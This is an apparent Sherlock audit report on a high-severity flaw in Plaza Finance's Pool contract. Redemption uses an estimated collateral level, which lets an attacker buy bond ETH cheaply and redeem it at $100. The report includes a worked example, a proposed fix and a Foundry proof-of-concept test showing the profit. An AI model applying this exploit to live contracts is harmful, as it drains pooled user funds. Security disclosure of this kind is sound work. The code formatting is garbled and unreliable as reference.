# Issue H-2: Anyone Can Get Funds From This Contract.

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Plaza Finance
**Keywords:** vulnerability, collateral level, ETH, bond ETH, market price, redeem rate, exploitation, attacker, pool reserves, price manipulation, liquidity, smart contract, financial loss, arbitrage, token supply, market rate, collateral threshold, profit extraction, decentralized finance, security

---

# Issue H-2: Anyone Can Get Funds From This Contract.

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/341)  
Found by: 0xadrii, KupiaSec, farman1094, future, novaman33

An attacker can purchase bond ETH at a low price and sell it at a higher price.

When selling bond ETH, the estimated collateral level is utilized instead of the current collateral level. By exploiting this vulnerability, an attacker can purchase bond ETH at various prices and sell it for the maximum price of $100.

\u0060\u0060\u0060solidity
https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L498
function getRedeemAmount(
    ...
) public pure returns(uint256) {
    ...
    uint256 tvl = (ethPrice * poolReserves).toBaseUnit(oracleDecimals);
    uint256 assetSupply = bondSupply;
    uint256 multiplier = POINT_EIGHT;
    // Calculate the collateral level based on the token type
    uint256 collateralLevel;
    if (tokenType == TokenType.BOND) {
        collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
    } else {
        ...
    }
    // Calculate the redeem rate based on the collateral level and token type
    uint256 redeemRate;
    if (collateralLevel <= COLLATERAL_THRESHOLD) {
        redeemRate = ((tvl * multiplier) / assetSupply);
    } else if (tokenType == TokenType.LEVERAGE) {
        redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
    }
}
\u0060\u0060\u0060
} else {
    redeemRate = BOND_TARGET_PRICE * PRECISION;
}
if (marketRate != 0 && marketRate < redeemRate) {
    redeemRate = marketRate;
}
// Calculate and return the final redeem amount
return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) /
    ethPrice) / PRECISION;

collateralLevel > 1.2

N/A

The attacker purchases bond ETH until the collateral level is less than 1.2 at various prices and then sells it all at the maximum price ($100).

The price calculation formula is as follows:
- When purchasing bond ETH: 
  - tvl = (ethPrice * poolReserve), 
  - collateralLevel = tvl / (bondSupply * 100). 
  - If collateralLevel <= 1.2, creationRate = tvl * 0.8 / bondSupply. 
  - If collateralLevel > 1.2, creationRate = 100.
  
- When selling bond ETH: 
  - tvl = (ethPrice * poolReserve), 
  - collateralLevel = (tvl - bondToSell * 100) / ((bondSupply - bondToSell) * 100). 
  - If collateralLevel <= 1.2, redeemRate = tvl * 0.8 / bondSupply. 
  - If collateralLevel > 1.2, redeemRate = 100.

Assuming: 
- poolReserve = 120 ETH, 
- bondSupply = 3000 bond ETH, 
- levSupply = 200 lev ETH, 
- ETH Price = $3075

- When Alice buys bond ETH for 30 ETH: 
  - tvl = 3075 * 120 = 369000, 
  - collateralLevel = 369000 / (3000 * 100) = 1.23, 
  - creationRate = 100. 
  - minted = 30 * 3075 / 100 = 922.5 bond ETH. 
  - poolReserve = 150 ETH, 
  - bondSupply = 3922.5, 
  - Alice\u0027s bond ETH amount = 922.5 bond ETH.
- When Alice buys bond ETH another 30 ETH: 
  \u0060\u0060\u0060
  tvl = 3075 * 150 = 461250,
  collateralLevel = 461250 / (3922.5 * 100) ~= 1.176 < 1.2,
  creationRate = 461250 * 0.8 / 3922.5 ~= 94.07
  minted = 30 * 3075 / (461250 * 0.8 / 3922.5) = 980.625
  poolReserve = 180 ETH,
  bondSupply = 4903.125. 
  Alice\u0027s bondEth amount = 1903.125 bondETH.
  \u0060\u0060\u0060

- When Alice sells all of her bond ETH: 
  \u0060\u0060\u0060
  tvl = 3075 * 180 = 553500,
  collateralLevel = (553500 - 1903.125 * 100) / (3000 * 100) = 363187.5 / 300,000 = 1.210625 > 1.2
  redeemRate = 100,
  receivedAmount = 1903.125 * 100 / 3075 ~= 61.89 ETH.
  \u0060\u0060\u0060
  Thus, Alice extracts approximately 1.89 ETH from this market. When Alice first buys at the price (creationRate) of $100, the market price (marketRate) is also nearly $100, resulting in no significant impact from the market price (Even if the decimal of marketRate is correct).

  Attacker can extract ETH until collateralLevel reaches 1.2. This amount is (ethPrice * poolReserve - 120 * bondSupply) ($). Even if collateralLevel < 1.2, bond ETH owners could sell their bond ETH and then extract ETH from this market.

An attacker could extract significant amounts of ETH from this market.

\u0060\u0060\u0060solidity
function getRedeemAmount(
    ...
) public pure returns(uint256) {
    ...
    // Calculate the collateral level based on the token type
    uint256 collateralLevel;
    if (tokenType == TokenType.BOND) {
        collateralLevel = (tvl * PRECISION) / (bondSupply * BOND_TARGET_PRICE);
    } else {
        ...
    }
    // Calculate the redeem rate based on the collateral level and token type
    uint256 redeemRate;
    if (collateralLevel <= COLLATERAL_THRESHOLD) {
        redeemRate = ((tvl * multiplier) / assetSupply);
    } else if (tokenType == TokenType.LEVERAGE) {
        redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
    } else {
        redeemRate = BOND_TARGET_PRICE * PRECISION;
    }
}
\u0060\u0060\u0060
if (marketRate != 0 && marketRate < redeemRate) {
    redeemRate = marketRate;
}
// Calculate and return the final redeem amount
return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) /
    ethPrice) / PRECISION;

TestCode  
https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/test/  
Pool.t.sol#L1156 Changed linked function to following code.

function testCreateRedeemWithFees() public {
    vm.startPrank(governance);
    // Create a pool with 2% fee
    params.fee = 20000; // 2% fee (1000000 precision)
    params.feeBeneficiary = address(0x942);
    // Mint and approve reserve tokens
    Token rToken = Token(params.reserveToken);
    rToken.mint(governance, 120 ether);
    rToken.approve(address(poolFactory), 120 ether);
    Pool pool = Pool(poolFactory.createPool(params, 120 ether, 3000 ether, 200 ether,
        "", "", "", "", false));
    vm.stopPrank();
    // User creates leverage tokens
    vm.startPrank(user);
    rToken.mint(user, 60 ether);
    mockPriceFeed.setMockPrice(3075 * int256(CHAINLINK_DECIMAL_PRECISION),
        uint8(CHAINLINK_DECIMAL));
    uint256 usedEth = 60 ether;
    uint256 receivedEth = 0;
    uint256 buyTime = 2;
    uint256 sellTime = 1;
    rToken.approve(address(pool), usedEth);
    uint256 bondAmount = 0;
    console2.log("Before Balance:", rToken.balanceOf(user));
    assertEq(rToken.balanceOf(user), 60 ether);
    for (uint256 i = 0; i < buyTime; i++) {
\u0060\u0060\u0060solidity
bondAmount += pool.create(Pool.TokenType.BOND, usedEth / buyTime, 0);
}
pool.bondToken().approve(address(pool), bondAmount);
for (uint256 i = 0; i < sellTime; i++) {
  receivedEth += pool.redeem(Pool.TokenType.BOND, bondAmount / sellTime, 0);
}
console2.log(" After Balance:", rToken.balanceOf(user));
assertLt(rToken.balanceOf(user), 60 ether);
vm.stopPrank();
// Reset state
rToken.burn(user, rToken.balanceOf(user));
rToken.burn(address(pool), rToken.balanceOf(address(pool)));
\u0060\u0060\u0060

forgetest--match-test”testCreateRedeemWithFees”-vv  
Result:  
[FAIL:  assertion failed:      61890244154579369433 >= 60000000000000000000]  
testCreateRedeemWithFees()         (gas:       2190059)     Logs:       Before     Balance:  
60000000000000000000AfterBalance: 61890244154579369433  

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
https://github.com/Convexity-Research/plaza-evm/pull/155
